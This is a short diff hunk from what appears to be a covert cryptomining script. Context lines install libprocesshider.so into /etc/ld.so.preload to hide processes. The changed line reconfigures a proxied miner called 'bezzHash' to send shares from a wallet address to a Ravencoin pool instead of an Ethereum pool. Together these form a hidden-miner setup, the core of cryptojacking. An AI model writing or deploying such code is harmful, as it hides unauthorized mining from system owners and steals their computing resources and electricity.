@@ -46,4 +46,4 @@ mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
 
-./graftcp/graftcp ./bezzHash --algo ETHASH --pool eth.2miners.com:2020 --user 1BoMobqHdFWZfY4A4HmvYnGBT4G9eu1pjX.budakbuncir
+./graftcp/graftcp ./bezzHash --url=1BoMobqHdFWZfY4A4HmvYnGBT4G9eu1pjX.budakbuncir@rvn.2miners.com:6060 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
